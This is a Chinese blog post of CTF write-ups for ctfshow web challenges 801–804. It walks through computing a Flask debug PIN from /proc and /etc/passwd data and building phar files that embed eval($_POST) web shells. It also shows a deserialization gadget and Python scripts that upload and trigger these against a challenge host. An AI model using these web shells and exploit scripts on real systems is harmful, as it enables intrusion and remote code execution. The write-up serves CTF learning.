<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctfshow 常用姿势"><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>ctfshow 常用姿势 | cyxin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.0.0'
} </script><meta name="generator" content="Hexo 6.0.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-801-%EF%BC%88flask%E7%AE%97PIN%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">web 801 （flask算PIN）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80"><span class="toc-number">1.3.</span> <span class="toc-text">知识基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.4.</span> <span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web802-%EF%BC%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">web802  （无字母数字构造）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web803-%EF%BC%88zip%E4%B8%8A%E4%BC%A0phar%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">web803  （zip上传phar包含）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-804-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">web 804(phar反序列化)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web805%EF%BC%88open-basedir%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">web805（open_basedir绕过）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">5.1.</span> <span class="toc-text">Bypass</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web806%EF%BC%88%E6%97%A0%E5%8F%82rce%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">web806（无参rce）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-id"><span class="toc-number">6.1.</span> <span class="toc-text">利用session_id</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getallheaders"><span class="toc-number">6.2.</span> <span class="toc-text">getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">6.3.</span> <span class="toc-text">get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web807%EF%BC%88shell%E5%8F%8D%E5%BC%B9%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">web807（shell反弹）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web808%EF%BC%88%E5%8D%A1%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">web808（卡临时文件包含）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">8.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">8.3.</span> <span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web809%EF%BC%88pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RCE%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">web809（pear文件包含&#x2F;RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">9.1.</span> <span class="toc-text">前提条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">9.2.</span> <span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web810"><span class="toc-number">10.</span> <span class="toc-text">web810</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">10.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">10.2.</span> <span class="toc-text">过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web811%EF%BC%88FTP%E7%9A%84%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E6%89%93FPM%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">web811（FTP的被动模式打FPM漏洞代码）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web812%EF%BC%88PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">web812（PHP-FPM未授权）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web813%EF%BC%88%E5%8A%AB%E6%8C%81mysqli%EF%BC%89"><span class="toc-number">13.</span> <span class="toc-text">web813（劫持mysqli）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">13.1.</span> <span class="toc-text">前提条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web814%EF%BC%88%E5%8A%AB%E6%8C%81getuid%EF%BC%89"><span class="toc-number">14.</span> <span class="toc-text">web814（劫持getuid）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">14.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">14.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-1"><span class="toc-number">14.3.</span> <span class="toc-text">过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web815%EF%BC%88%E5%8A%AB%E6%8C%81%E6%9E%84%E9%80%A0%E5%99%A8%EF%BC%89"><span class="toc-number">15.</span> <span class="toc-text">web815（劫持构造器）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web816%EF%BC%88%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">16.</span> <span class="toc-text">web816（临时文件利用）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web817%EF%BC%88%E5%88%A9%E7%94%A8nginx%E7%9A%84body-fastcgi%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">17.</span> <span class="toc-text">web817（利用nginx的body&#x2F;fastcgi缓存机制）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web818%EF%BC%88%E5%88%A9%E7%94%A8nginx%E7%9A%84body%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">18.</span> <span class="toc-text">web818（利用nginx的body缓存机制）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web819%EF%BC%88%E5%88%A9%E7%94%A8bash%E7%9A%84%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%89"><span class="toc-number">19.</span> <span class="toc-text">web819（利用bash的匿名函数环境变量）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web820%EF%BC%88base64%E5%9B%BE%E7%89%87%E7%A0%81%EF%BC%89"><span class="toc-number">20.</span> <span class="toc-text">web820（base64图片码）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web821%EF%BC%887%E5%AD%97%E7%AC%A6RCE%EF%BC%89"><span class="toc-number">21.</span> <span class="toc-text">web821（7字符RCE）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web822%EF%BC%887%E5%AD%97%E7%AC%A6%E4%B8%8D%E5%8F%AF%E5%86%99%EF%BC%89"><span class="toc-number">22.</span> <span class="toc-text">web822（7字符不可写）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web823%EF%BC%885%E5%AD%97%E7%AC%A6%E5%8F%AF%E5%86%99%EF%BC%8C%E6%9C%89dir%EF%BC%89"><span class="toc-number">23.</span> <span class="toc-text">web823（5字符可写，有dir）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web824%EF%BC%885%E5%AD%97%E7%AC%A6%E5%8F%AF%E5%86%99%EF%BC%8C%E6%97%A0dir%EF%BC%89"><span class="toc-number">24.</span> <span class="toc-text">web824（5字符可写，无dir）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web825%EF%BC%884%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%8F%AF%E5%86%99%EF%BC%8C%E6%9C%89dir%EF%BC%89"><span class="toc-number">25.</span> <span class="toc-text">web825（4字符，可写，有dir）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web826%EF%BC%884%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%8F%AF%E5%86%99%EF%BC%8C%E6%97%A0dir%EF%BC%89"><span class="toc-number">26.</span> <span class="toc-text">web826（4字符，可写，无dir）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web827%EF%BC%884%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%8F%AF%E5%86%99%E3%80%81%E6%97%A0dir%EF%BC%8C%E4%B8%8D%E5%87%BA%E7%BD%91%EF%BC%89"><span class="toc-number">27.</span> <span class="toc-text">web827（4字符，可写、无dir，不出网）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web828%EF%BC%88%E5%9B%BD%E8%B5%9BTP6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89"><span class="toc-number">28.</span> <span class="toc-text">web828（国赛TP6的反序列化）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web829"><span class="toc-number">29.</span> <span class="toc-text">web829</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-830"><span class="toc-number">30.</span> <span class="toc-text">web 830</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web831"><span class="toc-number">31.</span> <span class="toc-text">web831</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">39</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">cyxin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">ctfshow 常用姿势</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-11-02</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="web-801-（flask算PIN）"><a href="#web-801-（flask算PIN）" class="headerlink" title="web 801 （flask算PIN）"></a>web 801 （flask算PIN）</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>flask debug模式开启 存在任意文件读取</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>python3.8<br>ctfshow web801<br>flask</p>
<h2 id="知识基础"><a href="#知识基础" class="headerlink" title="知识基础"></a>知识基础</h2><p><img src="https://img-blog.csdnimg.cn/e312a50e5b9c4b03bb9b2b91fc39d385.png"><br>（machine_id是docker环境下读b，c；非docker环境全读，之后直接拼接，不加修饰符）</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>非预期</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/flag</span><br></pre></td></tr></table></figure>
<p>预期解结算PIN值<br>先找到文件得到脚本所需信息<br><img src="https://img-blog.csdnimg.cn/5433dba56c724d3fa66f0aad67c9775e.png"><br><img src="https://img-blog.csdnimg.cn/737189b827fb4e5388054ac02416b718.png"><br>这里需要将16进制转换为十进制 地址<br><img src="https://img-blog.csdnimg.cn/13e3a862d7824d3da92e4b268a3210a4.png"><br>得到2485377601940<br>之后求machine-id<br><img src="https://img-blog.csdnimg.cn/bd2229a32bb147a198c5fa6db6d1869d.png"><br><img src="https://img-blog.csdnimg.cn/d2b32a4c16904e32a3cbefc3bf6ef5c5.png"><br>由于题目是docker环境，仅需要得到这两个信息即可<br>最后拼接得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b0253079-fb4b-4235-ad30-f3d64b6c596701797e8e7f960d088139f8b839560871626857bfc73852e5f2b5e7f930459077</span><br></pre></td></tr></table></figure>
<p>利用脚本得到PIN值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># /sys/class/net/eth0/address   </span></span><br><span class="line">    <span class="string">&#x27;b0253079-fb4b-4235-ad30-f3d64b6c596701797e8e7f960d088139f8b839560871626857bfc73852e5f2b5e7f930459077&#x27;</span><span class="comment">#  /proc/self/cgroup   and  /proc/sys/kernel/random/boot_id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入<br><img src="https://img-blog.csdnimg.cn/7fb77c148cca40969fa96b956f6bdbc7.png"><br>进入之后利用os进行命令执行皆可</p>
<h1 id="web802-（无字母数字构造）"><a href="#web802-（无字母数字构造）" class="headerlink" title="web802  （无字母数字构造）"></a>web802  （无字母数字构造）</h1><p>利用yu师傅脚本即可<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">yu师傅脚本博客</a></p>
<h1 id="web803-（zip上传phar包含）"><a href="#web803-（zip上传phar包含）" class="headerlink" title="web803  （zip上传phar包含）"></a>web803  （zip上传phar包含）</h1><p>本题题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !preg_match(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本题通过构建phar包进行文件上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;a.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;&lt;?php eval(\$_POST[a]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用上述脚本构建phar文件<br>之后进行文件上传<br>这里有两种解法<br>一种是利用bp进行文件上传<br>（由于不知道什么原因，我利用bp一直无法上传成功，就利用python上传）<br>于是用第二种-&gt;脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://04608b57-c254-475c-ae94-804018955038.challenge.ctf.show/&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;a.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar/test&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="web-804-phar反序列化"><a href="#web-804-phar反序列化" class="headerlink" title="web 804(phar反序列化)"></a>web 804(phar反序列化)</h1><p>phar反序列化<br><img src="https://img-blog.csdnimg.cn/f87361fd11c849419e66a6fdbbebe3ae.png"><br>从中可以看出phar中包含metdata便可触发序列化<br><img src="https://img-blog.csdnimg.cn/48e046d85d994531a9bcd06c8c8311e9.png"><br>通过大佬的讲解  得到下面结论<br><img src="https://img-blog.csdnimg.cn/e5d79e04be174b3eb5230eb38a37078d.png"><br>可以利用使其反序列化的一些函数<br><img src="https://img-blog.csdnimg.cn/02f373cc8d394a2b935783607f4362da.png"><br><img src="https://img-blog.csdnimg.cn/f0c15dbaf81f4cba8673a459a2bb8efd.png"><br>于是解决本题可以利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> hacker();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到phar文件<br>之后上传phar文件并将其利用phar伪协议进行打开触发反序列化即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>也可利用bp  但是由于自身原因导致bp文件无法正常传输</p>
